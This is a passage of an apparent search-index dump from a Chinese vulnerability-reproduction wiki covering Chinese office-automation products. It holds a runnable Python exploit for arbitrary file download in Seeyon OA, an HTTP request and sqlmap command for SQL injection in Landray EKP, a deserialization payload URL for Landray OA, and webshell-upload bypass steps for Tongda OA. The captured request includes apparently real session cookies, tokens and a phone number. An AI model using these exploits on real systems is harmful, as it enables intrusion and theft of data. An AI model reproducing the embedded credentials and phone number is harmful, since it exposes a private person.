\u7cfb\u7edf\u5c06\u4f1a\u4e0b\u8f7d datasourceCtp.properties \u914d\u7f6e\u6587\u4ef6 \u66f4\u6539\u53c2\u6570 filePath \u53ef\u4e0b\u8f7d\u5176\u4ed6\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA\u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"workflow\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u6587\u4ef6\u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u81f4\u8fdcOA webmail.do\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d CNVD-2020-62422","title":"\u81f4\u8fdcOA webmail.do\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d CNVD-2020-62422"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/#\u81f4\u8fdcoa-webmaildo\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d-cnvd-2020-62422","text":"","title":"\u81f4\u8fdcOA webmail.do\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d CNVD-2020-62422"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A6-V5 \u81f4\u8fdcOA A8-V5 \u81f4\u8fdcOA G6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee url http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties \u5b58\u5728\u6f0f\u6d1e\u7684OA \u7cfb\u7edf\u5c06\u4f1a\u4e0b\u8f7d datasourceCtp.properties \u914d\u7f6e\u6587\u4ef6 \u66f4\u6539\u53c2\u6570 filePath \u53ef\u4e0b\u8f7d\u5176\u4ed6\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA\u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"workflow\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u6587\u4ef6\u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/#goby--poc","text":"[!NOTE] \u81f4\u8fdcOA webmail.do\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d CNVD-2020-62422","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20EKP%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363/","text":"\u84dd\u51ccOA EKP \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e CNVD-2021-01363 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6df1\u5733\u5e02\u84dd\u51cc\u8f6f\u4ef6\u80a1\u4efd\u6709\u9650\u516c\u53f8\u6570\u5b57OA(EKP)\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6d4b\u8bd5\u65f6\u95f4 2021-3-24 \u524d\u7248\u672c \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5b58\u5728SQL\u6ce8\u5165\u7684 Url\u4e3a,\u8fd9\u91cc\u62ff\u5b98\u65b9\u7684\u6f14\u793a\u7ad9\u70b9\u6f14\u793a\u6f0f\u6d1e\u8fc7\u7a0b https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true \u5176\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u7684\u53c2\u6570\u4e3a ordeby \uff0c \u6570\u636e\u5305\u5982\u4e0b GET / km / imeeting / km_imeeting_res / kmImeetingRes . do ? contentType = json & method = listUse & orderby = 1 & ordertype = down & s_ajax = true HTTP / 1 . 1 Host : demo . landray . com . cn Connection : close Pragma : no - cache Cache - Control : no - cache sec - ch - ua : \"Google Chrome\" ; v = \"89\" , \"Chromium\" ; v = \"89\" , \";Not A Brand\" ; v = \"99\" sec - ch - ua - mobile : ? 0 Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5 . 0 ( Windows NT 10 . 0 ; Win64 ; x64 ) AppleWebKit / 537 . 36 ( KHTML , like Gecko ) Chrome / 89 . 0 . 4389 . 90 Safari / 537 . 36 Accept : text / html , application / xhtml + xml , application / xml ; q = 0 . 9 , image / avif , image / webp , image / apng , * /*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 \u4fdd\u5b58\u4e3a\u6587\u4ef6\uff0c\u4f7f\u7528 Sqlmap \u8dd1\u4e00\u4e0b\u6ce8\u5165 sqlmap -r sql.txt -p orderby --dbs \u611f\u8c22\u540d\u5355 \u00b6 \u611f\u8c22 @Mia\u00f2a \u5e08\u5085\u7684\u6295\u7a3f","title":"\u84dd\u51ccOA EKP \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e CNVD-2021-01363"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20EKP%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363/#\u84dd\u51ccoa-ekp-\u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e-cnvd-2021-01363","text":"","title":"\u84dd\u51ccOA EKP \u540e\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e CNVD-2021-01363"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20EKP%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6df1\u5733\u5e02\u84dd\u51cc\u8f6f\u4ef6\u80a1\u4efd\u6709\u9650\u516c\u53f8\u6570\u5b57OA(EKP)\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u6f0f\u6d1e\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20EKP%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6d4b\u8bd5\u65f6\u95f4 2021-3-24 \u524d\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20EKP%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5b58\u5728SQL\u6ce8\u5165\u7684 Url\u4e3a,\u8fd9\u91cc\u62ff\u5b98\u65b9\u7684\u6f14\u793a\u7ad9\u70b9\u6f14\u793a\u6f0f\u6d1e\u8fc7\u7a0b https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true \u5176\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u7684\u53c2\u6570\u4e3a ordeby \uff0c \u6570\u636e\u5305\u5982\u4e0b GET / km / imeeting / km_imeeting_res / kmImeetingRes . do ? contentType = json & method = listUse & orderby = 1 & ordertype = down & s_ajax = true HTTP / 1 . 1 Host : demo . landray . com . cn Connection : close Pragma : no - cache Cache - Control : no - cache sec - ch - ua : \"Google Chrome\" ; v = \"89\" , \"Chromium\" ; v = \"89\" , \";Not A Brand\" ; v = \"99\" sec - ch - ua - mobile : ? 0 Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5 . 0 ( Windows NT 10 . 0 ; Win64 ; x64 ) AppleWebKit / 537 . 36 ( KHTML , like Gecko ) Chrome / 89 . 0 . 4389 . 90 Safari / 537 . 36 Accept : text / html , application / xhtml + xml , application / xml ; q = 0 . 9 , image / avif , image / webp , image / apng , * /*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 \u4fdd\u5b58\u4e3a\u6587\u4ef6\uff0c\u4f7f\u7528 Sqlmap \u8dd1\u4e00\u4e0b\u6ce8\u5165 sqlmap -r sql.txt -p orderby --dbs","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20EKP%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363/#\u611f\u8c22\u540d\u5355","text":"\u611f\u8c22 @Mia\u00f2a \u5e08\u5085\u7684\u6295\u7a3f","title":"\u611f\u8c22\u540d\u5355"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u84dd\u51ccOA \u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u84dd\u51ccOA \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u84dd\u51ccOA \u6f0f\u6d1e\u590d\u73b0 \u00b6 /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode] \u6f0f\u6d1e\u5728/sys/search/sys_search_main/sysSearchMain.do method \u4e3a editrParam\u3002\u53c2\u6570\u4e3a FdParameters\uff0c\u5728 com.landray.kmss.sys.search.jar \u4e2d\u7684 com.landray.kmss.sys.search.actions.SysSearchMainAction \u7c7b\u3002method \u4e3a editrParam\u3002 \u5bf9 fdParemNames \u7684\u5185\u5bb9\u8fdb\u884c\u4e86\u5224\u7a7a\u3002\u5982\u679c\u4e0d\u4e3a\u7a7a,\u8fdb\u5165 SysSearchDictUtil.getParamConditionEntry \u65b9\u6cd5\u3002 \u4e5f\u662f\u5bf9 fdParemNames \u8fdb\u884c\u4e86\u4e00\u6b21\u5224\u7a7a\u3002\u7136\u540e\u4f20\u5165 ObjectXML.objectXMLDecoderByString \u65b9\u6cd5\u3002 \u5c06\u4f20\u5165\u8fdb\u6765\u7684 string \u5b57\u7b26\u8fdb\u884c\u66ff\u6362\u3002\u5c06\u5176\u8f7d\u5165\u5b57\u8282\u6570\u7ec4\u7f13\u51b2\u533a\uff0c\u5728\u4f20\u9012\u7ed9 objectXmlDecoder\u3002 \u5728 objectXmlDecoder \u4e2d\u3002\u5c31\u66f4\u660e\u663e\u4e86\u3002\u5178\u578b\u7684 xmlDecoder \u53cd\u5e8f\u5217\u5316\u3002 \u6574\u4f53\u6d41\u7a0b\u53ea\u5bf9 FdParameters \u7684\u5185\u5bb9\u8fdb\u884c\u4e86\u4e00\u4e9b\u5185\u5bb9\u66ff\u6362\u3002 \u5bfc\u81f4 xmlDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 \u5229\u7528\u65b9\u5f0f\uff1a Xmldecoder payload \u751f\u6210 https://github.com/mhaskar/XMLDecoder-payload-gene...","title":"\u84dd\u51ccOA \u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u84dd\u51ccoa-\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e","text":"","title":"\u84dd\u51ccOA \u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u84dd\u51ccOA \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u84dd\u51ccOA","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode] \u6f0f\u6d1e\u5728/sys/search/sys_search_main/sysSearchMain.do method \u4e3a editrParam\u3002\u53c2\u6570\u4e3a FdParameters\uff0c\u5728 com.landray.kmss.sys.search.jar \u4e2d\u7684 com.landray.kmss.sys.search.actions.SysSearchMainAction \u7c7b\u3002method \u4e3a editrParam\u3002 \u5bf9 fdParemNames \u7684\u5185\u5bb9\u8fdb\u884c\u4e86\u5224\u7a7a\u3002\u5982\u679c\u4e0d\u4e3a\u7a7a,\u8fdb\u5165 SysSearchDictUtil.getParamConditionEntry \u65b9\u6cd5\u3002 \u4e5f\u662f\u5bf9 fdParemNames \u8fdb\u884c\u4e86\u4e00\u6b21\u5224\u7a7a\u3002\u7136\u540e\u4f20\u5165 ObjectXML.objectXMLDecoderByString \u65b9\u6cd5\u3002 \u5c06\u4f20\u5165\u8fdb\u6765\u7684 string \u5b57\u7b26\u8fdb\u884c\u66ff\u6362\u3002\u5c06\u5176\u8f7d\u5165\u5b57\u8282\u6570\u7ec4\u7f13\u51b2\u533a\uff0c\u5728\u4f20\u9012\u7ed9 objectXmlDecoder\u3002 \u5728 objectXmlDecoder \u4e2d\u3002\u5c31\u66f4\u660e\u663e\u4e86\u3002\u5178\u578b\u7684 xmlDecoder \u53cd\u5e8f\u5217\u5316\u3002 \u6574\u4f53\u6d41\u7a0b\u53ea\u5bf9 FdParameters \u7684\u5185\u5bb9\u8fdb\u884c\u4e86\u4e00\u4e9b\u5185\u5bb9\u66ff\u6362\u3002 \u5bfc\u81f4 xmlDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 \u5229\u7528\u65b9\u5f0f\uff1a Xmldecoder payload \u751f\u6210 https://github.com/mhaskar/XMLDecoder-payload-gene...","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u901a\u8fbeOA v11.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.2\u540e\u53f0\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u5141\u8bb8\u901a\u8fc7\u7ed5\u8fc7\u9ed1\u540d\u5355\u7684\u65b9\u6cd5\u6765\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u653b\u51fb \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u901a\u8fbeOA v11.2 \u73af\u5883\u642d\u5efa \u00b6 \u901a\u8fbeOA v11.2\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u540e\u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u540e\u53f0\uff0c\u9700\u8981\u901a\u8fc7\u767b\u5f55\u540e\u624d\u80fd\u8fdb\u884c\u4f7f\u7528 \u767b\u5f55\u540e\u70b9\u51fb \u83dc\u5355 -> \u7cfb\u7edf\u7ba1\u7406 -> \u9644\u4ef6\u7ba1\u7406 \u70b9\u51fb\u6dfb\u52a0\u9644\u5f55\u5b58\u50a8\u7ba1\u7406\u6dfb\u52a0\u5982\u4e0b(\u5b58\u50a8\u76ee\u5f55\u4e3a webroot \u76ee\u5f55\uff0c\u9ed8\u8ba4\u4e3a D:/MYOA/webroot/ ) \u70b9\u51fb \u7ec4\u7ec7 -> \u7cfb\u7edf\u7ba1\u7406\u5458 -> \u4e0a\u4f20\u9644\u4ef6 \u6293\u5305\u4f7f\u7528 windows \u7684\u7ed5\u8fc7\u65b9\u6cd5 shell.php -> shell.php. [!NOTE] 2012 \u4e3a\u76ee\u5f55 1717872192 \u4e3a\u62fc\u63a5\u7684\u6587\u4ef6\u540d \u6700\u540e\u7684shell\u540d\u5b57\u4e3a 1717872192.shell.php \u8bbf\u95ee\u6728\u9a6c\u6587\u4ef6","title":"\u901a\u8fbeOA v11.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u901a\u8fbeoa-v112\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"","title":"\u901a\u8fbeOA 